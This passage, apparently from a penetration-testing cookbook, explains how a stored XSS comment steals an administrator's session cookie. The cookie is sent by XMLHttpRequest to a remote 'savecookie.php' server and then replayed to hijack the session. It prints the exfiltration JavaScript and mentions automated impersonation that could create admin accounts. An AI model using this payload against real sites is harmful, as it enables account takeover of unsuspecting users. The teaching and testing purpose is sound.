    Now we have the admin''s session hijacked via persistent XSS attack.


    ### How it works...


    In short, we used an XSS vulnerability in the application to send the session
    cookie to a remote server through a JavaScript request; this server was configured
    to store the session cookies. Then, we took one session ID and implanted it in
    a different browser to hijack an authenticated user.


    The PHP file we made in the *Getting ready* section is the one that saves the
    received cookies when the XSS attack is executed.


    The comment we introduced is a script that uses the `XMLHttpRequest` object from
    JavaScript to make a request to our malicious server; that request is made in
    two steps:


    ```javascript

    xmlHttp.open("GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie,
    true);

    ```


    We open a request using the `GET` method, adding a parameter `cookie` to the `http://192.168.56.1/savecookie.php`
    URL whose value is the one stored in `document.cookie`, which is the variable
    that stores the cookies value in JavaScript. Finally, the last parameter that
    is set to `true` tells the browser that it will be an asynchronous request, which
    means that it does not have to wait for a response.


    ```javascript

    xmlHttp.send(null);

    ```


    This last instruction sends the request to the server. After the administrator
    logs in and views a page that includes the comment we posted, the script is executed
    and the administrator''s session cookie is stored in our server.


    Finally, once we get the session ID of a valid user, we just replace our own session
    cookie with it in the browser and reload the page to perform an operation, as
    if we were such user.


    155


    ![](index-174_2.png)


    [Technet24.ir](http://technet24.ir)


    *Exploitation – Low Hanging Fruits*


    There''s more...


    Instead of only saving the session cookies to a file, the malicious server can
    also use those cookies to send requests to the application impersonating legitimate
    users, in order to perform operations such as adding or deleting comments, uploading
    pictures, or creating new users, even administrators.


